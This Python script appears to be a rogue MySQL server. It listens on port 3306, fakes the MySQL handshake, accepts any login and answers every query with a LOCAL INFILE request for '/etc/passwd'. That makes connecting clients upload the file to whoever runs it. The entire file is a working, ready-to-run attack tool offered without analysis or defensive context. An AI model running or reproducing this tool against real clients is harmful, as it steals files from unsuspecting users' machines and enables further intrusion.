import struct
import asyncio
import logging
import sys


class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG':    '\033[94m', # blue
        'INFO':     '\033[92m', # green
        'WARNING':  '\033[93m', # yellow
        'ERROR':    '\033[91m', # red
        'CRITICAL': '\033[95m', # purple
        'RESET':    '\033[0m'   # reset
    }

    def format(self, record):
        levelname = record.levelname
        record.levelname = f'{self.COLORS[levelname]}[{levelname}]{self.COLORS["RESET"]}'
        result = logging.Formatter.format(self, record)
        record.levelname = levelname
        return result


log = logging.getLogger(__name__)
log.setLevel(logging.DEBUG)
log_handler = logging.StreamHandler(sys.stdout)
log_handler.setFormatter(ColoredFormatter('%(levelname)s: %(message)s'))
log.addHandler(log_handler)


class Packet():
    def __init__(self, seq:int, payload: bytes) -> None:
        self.seq = seq
        self.payload = payload

    def __bytes__(self):
        length = len(self.payload)
        if length < 65536:
            header = struct.Struct('<Hbb').pack(length, 0, self.seq)
        else:
            header = struct.Struct('<Hbb').pack(length & 0xFFFF, length >> 16, 0, self.seq)

        result = header + self.payload
        return result

    def tobytes(self):
        return self.__bytes__()


async def handler(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):
    async def handle_auth():
        length = int.from_bytes(await reader.readexactly(3), 'little') + 1
        data = await reader.readexactly(length)
        reply = Packet(data[0]+1, b'\0\0\0\x02\0\0\0')
        writer.write(reply.tobytes())
        await writer.drain()

    log.info(writer.transport.get_extra_info('peername'))
    hello = Packet(
        0,
        b"".join((
            b'\x0a',  # Protocol
            b'5.6.28-0ubuntu1.14.51.4_by_ppk' + b'\0',
            b'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
        ))
    ).tobytes()
    writer.write(hello)
    await writer.drain()

    await handle_auth()

    while 1:
        if writer.is_closing():
            break
        length = int.from_bytes(await reader.readexactly(3), 'little') + 1
        data = await reader.readexactly(length)
        # seq = data[0]
        if len(data) <= 1:
            continue

        p = Packet(data[0], data[1:])
        cmd = p.payload[0]
        match cmd:
            case 0x00: pass
            case 0x01:
                log.info('close')
                writer.close()
                await writer.wait_closed()
            case 0x02:
                reply = Packet(p.seq + 1, b'\0\0\0\x02\0\0\0')
                writer.write(reply.tobytes())
                await writer.drain()
            case 0x03:
                log.info('query')
                filename = '/etc/passwd'
                reply = Packet(p.seq + 1, b'\xFB' + filename.encode())
                writer.write(reply.tobytes())
                await writer.drain()
            case 0x1b:
                log.info('select db')
                reply = Packet(p.seq + 1, b'\xfe\x00\x00\x02\x00')
                writer.write(reply.tobytes())
                await writer.drain()
            case _:
                log.info(p.payload)
                reply = Packet(p.seq + 1, b'\0\0\0\x02\0\0\0')
                writer.write(reply.tobytes())
                await writer.drain()
        log.info('one packet handled')


async def main():
    server  = await asyncio.start_server(handler, '0.0.0.0', 3306)
    async with server:
        await server.serve_forever()


asyncio.run(main())
